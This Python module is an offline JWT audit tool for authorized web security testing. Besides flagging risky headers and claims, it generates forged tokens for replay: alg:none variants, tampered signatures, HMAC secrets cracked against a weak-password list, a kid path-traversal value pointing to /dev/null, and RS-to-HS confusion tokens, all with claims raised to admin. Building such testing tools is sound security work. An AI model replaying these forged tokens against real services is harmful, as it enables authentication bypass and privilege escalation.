"""Offline JWT/JWS audit aligned with PortSwigger's JWT attack methodology.

This module never contacts a target. It separates three different outcomes:

* ``offline_confirmed`` - cryptographic evidence is complete locally, such as a
  valid HMAC signature matching a weak secret;
* ``candidate`` - the token itself contains a dangerous condition; and
* ``mutation`` - a forged token that must be replayed against the same protected
  endpoint before it can become a server-side finding.

The distinction is important: merely being able to construct an ``alg:none`` or
``kid`` token does not prove that an application accepts it.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit


_HS_WORDLIST = [
    "secret", "password", "changeme", "admin", "test", "1234", "12345", "123456",
    "jwt", "jwtsecret", "your-256-bit-secret", "your_jwt_secret", "supersecret",
    "myjwtsecret", "s3cr3t", "P@ssw0rd", "default", "example", "key", "token",
    "development", "dev", "prod", "production", "staging",
]
_B64URL_RE = re.compile(r"^[A-Za-z0-9_-]*$")
_HS_HASHES = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}
_RS_TO_HS = {"RS256": "HS256", "RS384": "HS384", "RS512": "HS512"}
_MAX_WORDLIST = 100_000


def _b64url_decode(value: str) -> bytes:
    if not _B64URL_RE.fullmatch(value):
        raise ValueError("contains non-base64url characters")
    try:
        return base64.urlsafe_b64decode((value + "=" * (-len(value) % 4)).encode("ascii"))
    except Exception as exc:
        raise ValueError(f"invalid base64url: {exc}") from exc


def _b64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def _encode_json(value: dict[str, Any]) -> str:
    return _b64url_encode(
        json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    )


def _decode_json_object(value: str, label: str) -> tuple[dict[str, Any], list[str]]:
    duplicates: list[str] = []

    def object_hook(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
        result: dict[str, Any] = {}
        for key, item in pairs:
            if key in result:
                duplicates.append(key)
            result[key] = item
        return result

    try:
        decoded = _b64url_decode(value).decode("utf-8")
        parsed = json.loads(decoded, object_pairs_hook=object_hook)
    except Exception as exc:
        raise ValueError(f"malformed {label}: {exc}") from exc
    if not isinstance(parsed, dict):
        raise ValueError(f"malformed {label}: expected a JSON object")
    return parsed, sorted(set(duplicates))


def _sign_hmac(header_b64: str, payload_b64: str, secret: bytes, alg: str) -> str:
    hash_fn = _HS_HASHES.get(alg)
    if not hash_fn:
        raise ValueError(f"unsupported HMAC algorithm {alg!r}")
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    return _b64url_encode(hmac.new(secret, signing_input, hash_fn).digest())


def _hs_verify(
    header_b64: str,
    payload_b64: str,
    sig_b64: str,
    secret: str,
    alg: str,
) -> bool:
    try:
        expected = _b64url_decode(sig_b64)
        actual = _b64url_decode(
            _sign_hmac(header_b64, payload_b64, secret.encode("utf-8"), alg)
        )
    except ValueError:
        return False
    return hmac.compare_digest(actual, expected)


def _mutate_payload(
    payload: dict[str, Any], claim_overrides: dict[str, Any] | None
) -> dict[str, Any]:
    mutated = dict(payload)
    if claim_overrides:
        mutated.update(claim_overrides)
        return mutated

    for field_name in ("isAdmin", "is_admin", "admin"):
        if field_name in mutated:
            mutated[field_name] = True
            return mutated
    if "roles" in mutated:
        mutated["roles"] = ["admin"]
        return mutated
    if "role" in mutated:
        mutated["role"] = "admin"
        return mutated
    if "sub" in mutated:
        mutated["sub"] = f"{mutated['sub']}-wafmcp-probe"
        return mutated
    mutated["wafmcp_probe"] = True
    return mutated


@dataclass
class JwtAudit:
    valid_shape: bool
    token_kind: str = "unknown"
    header: dict[str, Any] = field(default_factory=dict)
    payload: dict[str, Any] = field(default_factory=dict)
    signature_b64: str = ""
    findings: list[dict[str, Any]] = field(default_factory=list)
    signals: list[dict[str, Any]] = field(default_factory=list)
    mutations: dict[str, Any] = field(default_factory=dict)
    cracked_secret: str | None = None
    errors: list[str] = field(default_factory=list)

    @property
    def forged_none_token(self) -> str:
        variants = self.mutations.get("alg_none_tokens", {})
        return str(variants.get("none", "")) if isinstance(variants, dict) else ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "methodology": "https://portswigger.net/web-security/jwt",
            "valid_shape": self.valid_shape,
            "token_kind": self.token_kind,
            "header": self.header,
            "payload": self.payload,
            "signature_present": bool(self.signature_b64),
            "findings": self.findings,
            "signals": self.signals,
            "mutations": self.mutations,
            # Compatibility with the previous schema.
            "forged_none_token": self.forged_none_token,
            "cracked_secret": self.cracked_secret,
            "errors": self.errors,
            "server_acceptance_required": bool(self.mutations),
            "next_steps": self._next_steps(),
        }

    def _next_steps(self) -> list[str]:
        steps: list[str] = []
        if "tampered_signature_token" in self.mutations:
            steps.append(
                "Replay tampered_signature_token against the same protected endpoint and "
                "identity context as the original. Acceptance of the modified claims proves "
                "that the server is not verifying the signature."
            )
        if "alg_none_tokens" in self.mutations:
            steps.append(
                "Replay the alg_none_tokens variants, preserving the trailing dot. Only "
                "server acceptance of modified claims confirms an unsigned-token bypass."
            )
        if self.cracked_secret and "weak_hmac_token" in self.mutations:
            steps.append(
                "The original HMAC signature matched the reported weak secret offline. "
                "Replay weak_hmac_token to demonstrate the resulting privilege or identity impact."
            )
        if "kid_dev_null_token" in self.mutations:
            steps.append(
                "Replay kid_dev_null_token only when the target is expected to run on Linux. "
                "Acceptance indicates that kid controls a filesystem key lookup and /dev/null "
                "was used as an empty HMAC key."
            )
        if "algorithm_confusion_token" in self.mutations:
            steps.append(
                "Replay algorithm_confusion_token. The public key bytes must exactly match the "
                "server's verification key; acceptance confirms RS-to-HS algorithm confusion."
            )
        if any(s["type"] in {"jwk_header", "jku_header", "x5c_header", "x5u_header"}
               for s in self.signals):
            steps.append(
                "JOSE key-selection headers are an attack surface, not a finding by themselves. "
                "Use an authorized Burp JWT Editor test with a self-signed key and report only "
                "if the server accepts modified claims."
            )
        if not steps and not self.findings and not self.errors:
            steps.append("No directly testable JWT weakness was identified from this token.")
        return steps


def _add_claim_signals(audit: JwtAudit) -> None:
    now = int(time.time())
    exp = audit.payload.get("exp")
    iat = audit.payload.get("iat")
    nbf = audit.payload.get("nbf")

    if exp is None:
        audit.signals.append({
            "type": "no_expiry", "severity": "info", "status": "best_practice",
            "detail": "Token has no exp claim. This is a lifetime/revocation concern, not an auth bypass.",
        })
    elif not isinstance(exp, (int, float)) or isinstance(exp, bool):
        audit.signals.append({
            "type": "invalid_exp_type", "severity": "low", "status": "candidate",
            "detail": f"exp should be a NumericDate, got {type(exp).__name__}.",
        })
    else:
        if exp < now:
            audit.signals.append({
                "type": "expired", "severity": "info", "status": "informational",
                "detail": f"Token expired {now - int(exp)} seconds ago.",
            })
        lifetime_base = iat if isinstance(iat, (int, float)) and not isinstance(iat, bool) else now
        if exp - lifetime_base > 365 * 24 * 60 * 60:
            audit.signals.append({
                "type": "long_expiry", "severity": "low", "status": "best_practice",
                "detail": f"Token lifetime is approximately {(exp - lifetime_base) // 86400} days.",
            })

    if isinstance(nbf, (int, float)) and not isinstance(nbf, bool) and nbf > now:
        audit.signals.append({
            "type": "not_yet_valid", "severity": "info", "status": "informational",
            "detail": f"Token is not valid for another {int(nbf - now)} seconds.",
        })
    if isinstance(iat, (int, float)) and not isinstance(iat, bool) and iat > now + 300:
        audit.signals.append({
            "type": "future_iat", "severity": "low", "status": "candidate",
            "detail": f"iat is {int(iat - now)} seconds in the future.",
        })
    if "aud" not in audit.payload:
        audit.signals.append({
            "type": "missing_audience", "severity": "info", "status": "best_practice",
            "detail": "Token has no aud claim, so intended-recipient binding cannot be assessed.",
        })


def _add_header_signals(audit: JwtAudit) -> None:
    header = audit.header
    kid = header.get("kid")
    if kid is not None:
        kid_text = str(kid)
        audit.signals.append({
            "type": "kid_header", "severity": "info", "status": "attack_surface",
            "detail": "kid is user-controlled token metadata; server-side key lookup must be tested.",
        })
        if any(marker in kid_text for marker in ("..", "/", "\\", "'", '"', ";", "\x00")):
            audit.signals.append({
                "type": "kid_injection_candidate", "severity": "medium", "status": "candidate",
                "detail": f"kid contains path/SQL metacharacters: {kid_text!r}. Acceptance is required.",
            })

    if isinstance(header.get("jwk"), dict):
        audit.signals.append({
            "type": "jwk_header", "severity": "medium", "status": "attack_surface",
            "detail": "Token embeds a JWK. This is vulnerable only if the server trusts an attacker key.",
        })
    if "x5c" in header:
        audit.signals.append({
            "type": "x5c_header", "severity": "medium", "status": "attack_surface",
            "detail": "Token embeds an X.509 chain. Test whether arbitrary certificates are trusted.",
        })
    for parameter in ("jku", "x5u"):
        if parameter not in header:
            continue
        value = str(header[parameter])
        parsed = urlsplit(value)
        details = f"{parameter} selects remote key material from {value!r}."
        if parsed.scheme not in {"https"} or not parsed.hostname:
            details += " URL is missing a valid HTTPS origin."
        audit.signals.append({
            "type": f"{parameter}_header", "severity": "medium", "status": "attack_surface",
            "detail": details + " Server fetch/allowlist behavior must be verified.",
        })
    if "crit" in header:
        audit.signals.append({
            "type": "critical_extensions", "severity": "info", "status": "attack_surface",
            "detail": f"crit declares extensions {header['crit']!r}; parser consistency should be checked.",
        })


def analyze(
    token: str,
    wordlist: list[str] | None = None,
    *,
    public_key_pem: str | None = None,
    claim_overrides: dict[str, Any] | None = None,
) -> JwtAudit:
    """Decode and audit one compact JWT/JWS without contacting a target."""
    parts = token.strip().split(".")
    if len(parts) == 5:
        audit = JwtAudit(valid_shape=True, token_kind="JWE")
        audit.signals.append({
            "type": "encrypted_jwe", "severity": "info", "status": "unsupported",
            "detail": "Five-part compact JWE detected. JWS signature attacks do not apply directly.",
        })
        return audit
    if len(parts) != 3:
        return JwtAudit(
            valid_shape=False,
            token_kind="unknown",
            errors=[f"expected 3-part JWS or 5-part JWE, got {len(parts)} parts"],
        )

    header_b64, payload_b64, sig_b64 = parts
    audit = JwtAudit(valid_shape=True, token_kind="JWS", signature_b64=sig_b64)
    try:
        audit.header, duplicate_header = _decode_json_object(header_b64, "header")
        audit.payload, duplicate_payload = _decode_json_object(payload_b64, "payload")
    except ValueError as exc:
        audit.valid_shape = False
        audit.errors.append(str(exc))
        return audit

    for where, names in (("header", duplicate_header), ("payload", duplicate_payload)):
        if names:
            audit.findings.append({
                "type": f"duplicate_{where}_parameters",
                "severity": "medium",
                "status": "candidate",
                "detail": f"Duplicate {where} keys {names!r} may be interpreted inconsistently.",
            })

    raw_alg = audit.header.get("alg")
    alg = str(raw_alg).upper() if raw_alg is not None else ""
    if not alg:
        audit.findings.append({
            "type": "missing_alg", "severity": "high", "status": "candidate",
            "detail": "JWS header has no alg. Server acceptance of modified claims is required.",
        })
    elif alg == "NONE":
        audit.findings.append({
            "type": "alg_none_declared", "severity": "high", "status": "candidate",
            "detail": "Input declares alg=none. Only protected-endpoint acceptance proves auth bypass.",
        })
    elif alg not in {*_HS_HASHES, "RS256", "RS384", "RS512", "ES256", "ES384", "ES512",
                     "PS256", "PS384", "PS512", "EDDSA"}:
        audit.signals.append({
            "type": "unexpected_algorithm", "severity": "medium", "status": "candidate",
            "detail": f"Unrecognized or unexpected alg value {raw_alg!r}.",
        })
    if alg != "NONE" and not sig_b64:
        audit.findings.append({
            "type": "missing_signature", "severity": "high", "status": "candidate",
            "detail": f"alg={raw_alg!r} is declared but the signature segment is empty.",
        })

    mutated_payload = _mutate_payload(audit.payload, claim_overrides)
    mutated_payload_b64 = _encode_json(mutated_payload)
    audit.mutations["tampered_signature_token"] = (
        f"{header_b64}.{mutated_payload_b64}.{sig_b64}"
    )

    none_tokens: dict[str, str] = {}
    for variant in ("none", "None", "NONE", "nOnE"):
        none_header = dict(audit.header)
        none_header["alg"] = variant
        none_tokens[variant] = f"{_encode_json(none_header)}.{mutated_payload_b64}."
    audit.mutations["alg_none_tokens"] = none_tokens

    _add_header_signals(audit)
    _add_claim_signals(audit)

    if alg in _RS_TO_HS:
        audit.signals.append({
            "type": "rs_hs_confusion_surface",
            "severity": "info" if not public_key_pem else "high",
            "status": "attack_surface" if not public_key_pem else "candidate",
            "detail": (
                f"{alg} uses an RSA verification key. Supply the server's exact public "
                "key bytes to generate an RS-to-HS confusion mutation; acceptance is required."
                if not public_key_pem else
                f"The exact supplied public key bytes can be tested as an HMAC secret for {alg}."
            ),
        })

    if alg in _HS_HASHES:
        words = list(_HS_WORDLIST if wordlist is None else wordlist)
        if len(words) > _MAX_WORDLIST:
            words = words[:_MAX_WORDLIST]
            audit.signals.append({
                "type": "wordlist_truncated", "severity": "info", "status": "informational",
                "detail": f"Wordlist was capped at {_MAX_WORDLIST} entries.",
            })
        for candidate in words:
            secret = str(candidate)
            if _hs_verify(header_b64, payload_b64, sig_b64, secret, alg):
                audit.cracked_secret = secret
                audit.findings.append({
                    "type": "weak_hmac_secret", "severity": "critical",
                    "status": "offline_confirmed",
                    "detail": "A supplied/default word matched the original HMAC signature. "
                              "Arbitrary tokens can be signed with this secret.",
                })
                forged_header_b64 = _encode_json(dict(audit.header))
                forged_sig = _sign_hmac(
                    forged_header_b64, mutated_payload_b64, secret.encode("utf-8"), alg
                )
                audit.mutations["weak_hmac_token"] = (
                    f"{forged_header_b64}.{mutated_payload_b64}.{forged_sig}"
                )
                break

    if "kid" in audit.header:
        dev_null_header = dict(audit.header)
        dev_null_header["alg"] = "HS256"
        dev_null_header["kid"] = "../../../../../../dev/null"
        dev_null_header_b64 = _encode_json(dev_null_header)
        empty_sig = _sign_hmac(dev_null_header_b64, mutated_payload_b64, b"", "HS256")
        audit.mutations["kid_dev_null_token"] = (
            f"{dev_null_header_b64}.{mutated_payload_b64}.{empty_sig}"
        )

    if public_key_pem and alg in _RS_TO_HS:
        confusion_alg = _RS_TO_HS[alg]
        confusion_header = dict(audit.header)
        confusion_header["alg"] = confusion_alg
        for key_parameter in ("jwk", "jku", "x5c", "x5u"):
            confusion_header.pop(key_parameter, None)
        confusion_header_b64 = _encode_json(confusion_header)
        confusion_sig = _sign_hmac(
            confusion_header_b64,
            mutated_payload_b64,
            public_key_pem.encode("utf-8"),
            confusion_alg,
        )
        audit.mutations["algorithm_confusion_token"] = (
            f"{confusion_header_b64}.{mutated_payload_b64}.{confusion_sig}"
        )
        audit.signals.append({
            "type": "rs_hs_confusion_candidate", "severity": "high", "status": "candidate",
            "detail": f"Generated {alg}->{confusion_alg} token using the supplied public key bytes. "
                      "Server acceptance is required.",
        })

    return audit
